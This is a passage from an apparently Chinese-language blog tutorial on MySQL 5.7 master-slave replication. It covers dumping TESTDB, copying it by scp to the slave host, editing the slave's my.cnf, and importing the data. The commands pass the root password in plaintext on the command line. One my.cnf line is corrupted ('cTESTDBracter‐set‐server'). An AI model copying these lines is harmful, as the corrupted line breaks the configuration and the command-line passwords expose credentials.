testdb</span><br><span class="line">ib_logfile0      mysql.sock.lock</span><br><span class="line">[root@MySQL1 ~]<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x4F20;&#x7ED9;&#x4ECE;&#x670D;&#x52A1;&#x5668;</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;mysqldump -uroot -pJaking@vip.163.com -B TESTDB &gt; TESTDB.sql</span><br><span class="line">mysqldump:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line"></span><br><span class="line">[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;ls</span><br><span class="line">BUILD&#xA0;CPackConfig.cmake&#xA0;install_manifest.txt&#xA0;mysys&#xA0;storage</span><br><span class="line">client&#xA0;CPackSourceConfig.cmake&#xA0;libbinlogevents&#xA0;mysys_ssl&#xA0;strings</span><br><span class="line">cmake&#xA0;CTestTestfile.cmake&#xA0;libbinlogstandalone&#xA0;packaging&#xA0;support&#x2010;files</span><br><span class="line">CMakeCache.txt&#xA0;dbug&#xA0;libevent&#xA0;plugin&#xA0;testclients</span><br><span class="line">CMakeFiles&#xA0;Docs&#xA0;libmysql&#xA0;rapid&#xA0;unittest</span><br><span class="line">cmake_install.cmake&#xA0;Doxyfile&#x2010;perfschema&#xA0;libmysqld&#xA0;README&#xA0;VERSION</span><br><span class="line">CMakeLists.txt&#xA0;extra&#xA0;libservices&#xA0;regex&#xA0;VERSION.dep</span><br><span class="line">cmd&#x2010;line&#x2010;utils&#xA0;TESTDB.sql&#xA0;make_dist.cmake&#xA0;scripts&#xA0;vio</span><br><span class="line">config.h.cmake&#xA0;include&#xA0;Makefile&#xA0;source_downloads&#xA0;win</span><br><span class="line">configure.cmake&#xA0;info_macros.cmake&#xA0;man&#xA0;sql&#xA0;zlib</span><br><span class="line">COPYING&#xA0;INSTALL&#xA0;mysql&#x2010;test&#xA0;sql&#x2010;common</span><br><span class="line"></span><br><span class="line">[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;scp&#xA0;TESTDB.sql&#xA0;192.168.10.68:/root</span><br><span class="line">The&#xA0;authenticity&#xA0;of&#xA0;host&#xA0;&apos;192.168.10.68&#xA0;(192.168.10.68)&apos;&#xA0;can&apos;t&#xA0;be&#xA0;established.</span><br><span class="line">ECDSA&#xA0;key&#xA0;fingerprint&#xA0;is 57:3d:7f:91:5a:bc:6f:a1:88:4f:d2:fc:17:0e:51:8b.</span><br><span class="line">Are&#xA0;you&#xA0;sure&#xA0;you&#xA0;want&#xA0;to&#xA0;continue&#xA0;connecting&#xA0;(yes/no)?&#xA0;yes</span><br><span class="line">Warning:&#xA0;Permanently&#xA0;added&#xA0;&apos;192.168.10.68&apos;&#xA0;(ECDSA)&#xA0;to&#xA0;the&#xA0;list&#xA0;of&#xA0;knownhosts.</span><br><span class="line">root@192.168.10.68&apos;s&#xA0;password:</span><br><span class="line">TESTDB.sql&#xA0;100%&#xA0;1765&#xA0;1.7KB/s&#xA0;00:00</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x914D;&#x7F6E;-Slave-192-168-10-68"><a href="#&#x914D;&#x7F6E;-Slave-192-168-10-68" class="headerlink" title="&#x914D;&#x7F6E; Slave 192.168.10.68"></a>&#x914D;&#x7F6E; Slave 192.168.10.68</h2><h3 id="&#x914D;&#x7F6E;-etc-my-cnf-1"><a href="#&#x914D;&#x7F6E;-etc-my-cnf-1" class="headerlink" title="&#x914D;&#x7F6E; /etc/my.cnf"></a>&#x914D;&#x7F6E; /etc/my.cnf</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL2&#xA0;~]#&#xA0;vim&#xA0;/etc/my.cnf</span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">cTESTDBracter&#x2010;set&#x2010;server=utf8</span><br><span class="line">collation&#x2010;server=utf8_general_ci</span><br><span class="line"></span><br><span class="line">skip&#x2010;name&#x2010;resolve</span><br><span class="line">user=mysql</span><br><span class="line">port=3306</span><br><span class="line">basedir=/usr/local/mysql57</span><br><span class="line">datadir=/data/mysql</span><br><span class="line">tmpdir=/tmp</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">log&#x2010;error=/data/mysql/mysqld.log</span><br><span class="line">pid&#x2010;file=/data/mysql/mysqld.pid</span><br><span class="line"></span><br><span class="line">server&#x2010;id=2</span><br><span class="line">#&#x4ECE;&#x670D;&#x52A1;&#x5668;ID&#x53F7;&#xFF0C;&#x4E0D;&#x8981;&#x548C;&#x4E3B;ID&#x76F8;&#x540C;&#xA0;&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6BCF;&#x4E2A;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;server&#x2010;id&#x503C;&#xFF0C;&#x5FC5;&#x987B;&#x4E0E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4EE5;&#x53CA;&#x5176;&#x5B83;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E0D;&#x76F8;&#x540C;&#x3002;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;server&#x2010;id&#x503C;&#x7C7B;&#x4F3C;&#x4E8E;IP&#x5730;&#x5740;&#xFF1A;&#x8FD9;&#x4E9B;ID&#x503C;&#x80FD;&#x552F;&#x4E00;&#x8BC6;&#x522B;&#x590D;&#x5236;&#x670D;&#x52A1;&#x5668;&#x7FA4;&#x96C6;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x5B9E;&#x4F8B;&#x3002;</span><br><span class="line">lower_case_table_names=1</span><br><span class="line">#&#x6CE8;&#x610F;&#xFF1A;Linux&#x4E0B;&#x90E8;&#x7F72;&#x5B89;&#x88C5;MySQL&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5230;/etc/my.cnf&#xA0;&#x4E0B;&#x914D;&#x7F6E;&#xA0;lower_case_table_names=1&#xA0;&#x4F7F;Linux&#x73AF;&#x5883;&#x4E0B;MySQL&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;MyCAT&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x8868;&#x7684;&#x9519;&#x8BEF;&#xFF01;</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">&quot;/etc/my.cnf&quot;&#xA0;20L,&#xA0;649C&#xA0;written</span><br></pre></td></tr></tbody></table></figure><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL2&#xA0;~]#&#xA0;service&#xA0;mysqld&#xA0;restart</span><br><span class="line">Shutting&#xA0;down&#xA0;MySQL..&#xA0;[&#xA0;OK&#xA0;]</span><br><span class="line">Starting&#xA0;MySQL.&#xA0;[&#xA0;OK&#xA0;]</span><br></pre></td></tr></tbody></table></figure><p><em>&#x4E24;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;mysql&#x7248;&#x672C;&#x8981;&#x4E00;&#x81F4;</em></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1&#xA0;~]<span class="comment">#&#xA0;mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;pJaking@vip.163.com</span></span><br><span class="line">mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line">Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line">Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;21</span><br><span class="line">Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line">Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.</span><br><span class="line"></span><br><span class="line">Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line">affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">variables</span>&#xA0;<span class="keyword">like</span>&#xA0;<span class="string">&apos;%version%&apos;</span>;</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;Variable_name&#xA0;|&#xA0;Value&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;innodb_version&#xA0;|&#xA0;5.7.19&#xA0;|</span><br><span class="line"> |&#xA0;protocol_version&#xA0;|&#xA0;10&#xA0;|</span><br><span class="line"> |&#xA0;slave_type_conversions&#xA0;|&#xA0;|</span><br><span class="line"> |&#xA0;tls_version&#xA0;|&#xA0;TLSv1,TLSv1.1&#xA0;|</span><br><span class="line"> |&#xA0;version&#xA0;|&#xA0;5.7.19&#x2010;log&#xA0;|</span><br><span class="line"> |&#xA0;version_comment&#xA0;|&#xA0;Source&#xA0;distribution&#xA0;|</span><br><span class="line"> |&#xA0;version_compile_machine&#xA0;|&#xA0;x86_64&#xA0;|</span><br><span class="line"> |&#xA0;version_compile_os&#xA0;|&#xA0;Linux&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> 8&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.01</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;</span><br><span class="line"></span><br><span class="line">[root@MySQL2&#xA0;mysql]<span class="comment">#&#xA0;mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;pJaking@vip.163.com</span></span><br><span class="line"> mysql:&#xA0;[<span class="keyword">Warning</span>]&#xA0;<span class="keyword">Using</span>&#xA0;a&#xA0;<span class="keyword">password</span>&#xA0;<span class="keyword">on</span>&#xA0;the&#xA0;command&#xA0;line&#xA0;<span class="keyword">interface</span>&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line"> Welcome&#xA0;<span class="keyword">to</span>&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line"> Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;6</span><br><span class="line"> Server&#xA0;version:&#xA0;5.7.19&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line"> Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.</span><br><span class="line"></span><br><span class="line"> Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line"> affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line"> owners.</span><br><span class="line"></span><br><span class="line"> Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;statement.</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">variables</span>&#xA0;<span class="keyword">like</span>&#xA0;<span class="string">&apos;%version%&apos;</span>;</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;Variable_name&#xA0;|&#xA0;Value&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;innodb_version&#xA0;|&#xA0;5.7.19&#xA0;|</span><br><span class="line"> |&#xA0;protocol_version&#xA0;|&#xA0;10&#xA0;|</span><br><span class="line"> |&#xA0;slave_type_conversions&#xA0;|&#xA0;|</span><br><span class="line"> |&#xA0;tls_version&#xA0;|&#xA0;TLSv1,TLSv1.1&#xA0;|</span><br><span class="line"> |&#xA0;version&#xA0;|&#xA0;5.7.19&#xA0;|</span><br><span class="line"> |&#xA0;version_comment&#xA0;|&#xA0;Source&#xA0;distribution&#xA0;|</span><br><span class="line"> |&#xA0;version_compile_machine&#xA0;|&#xA0;x86_64&#xA0;|</span><br><span class="line"> |&#xA0;version_compile_os&#xA0;|&#xA0;Linux&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> 8&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.02</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;<span class="keyword">exit</span></span><br><span class="line"> Bye</span><br></pre></td></tr></tbody></table></figure><p>&#x6D4B;&#x8BD5;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6210;&#x529F;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL2&#xA0;mysql]<span class="comment">#&#xA0;mysql -uslave -pJaking@vip.163.com -h 192.168.10.67</span></span><br><span class="line">mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line">Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line">Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;5</span><br><span class="line">Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line">Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.</span><br><span class="line"></span><br><span class="line">Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line">affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">databases</span>;</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">|&#xA0;Database&#xA0;|</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">|&#xA0;information_schema&#xA0;|</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">1&#xA0;row&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br></pre></td></tr></tbody></table></figure><p> #&#x6B64;&#x65F6;&#x770B;&#x4E0D;&#x5230; TESTDB &#x6570;&#x636E;&#x5E93;&#x5C5E;&#x6B63;&#x5E38;&#x73B0;&#x8C61;</p><p>&#x5411;TESTDB&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL2&#xA0;~]<span class="comment">#&#xA0;mysql -uroot -pJaking@vip.163.com &lt; TESTDB.sql </span></span><br><span class="line">mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line"></span><br><span class="line">[root@MySQL2&#xA0;~]<span class="comment">#&#xA0;mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line">Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line">Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;11</span><br><span class="line">Server&#xA0;version:&#xA0;5.7.19&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line">Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.</span><br><span class="line"></span><br><span class="line">Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line">affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">databases</span>;</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">|&#xA0;Database&#xA0;|</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">|&#xA0;information_schema&#xA0;|</span><br><span class="line">|&#xA0;TESTDB&#xA0;|</span><br><span class="line">|&#xA0;mysql&#xA0;|</span><br><span class="line">|&#xA0;performance_schema&#xA0;|</span><br><span class="line">|&#xA0;sys&#xA0;|</span><br><span class="line">+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line">5&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">use</span>&#xA0;TESTDB;</span><br><span class="line">Reading&#xA0;table&#xA0;information&#xA0;for&#xA0;completion&#xA0;of&#xA0;table&#xA0;and&#xA0;column&#xA0;names</span><br><span class="line">You&#xA0;can&#xA0;turn&#xA0;off&#xA0;this&#xA0;feature&#xA0;to&#xA0;get&#xA0;a&#xA0;quicker&#xA0;startup&#xA0;<span 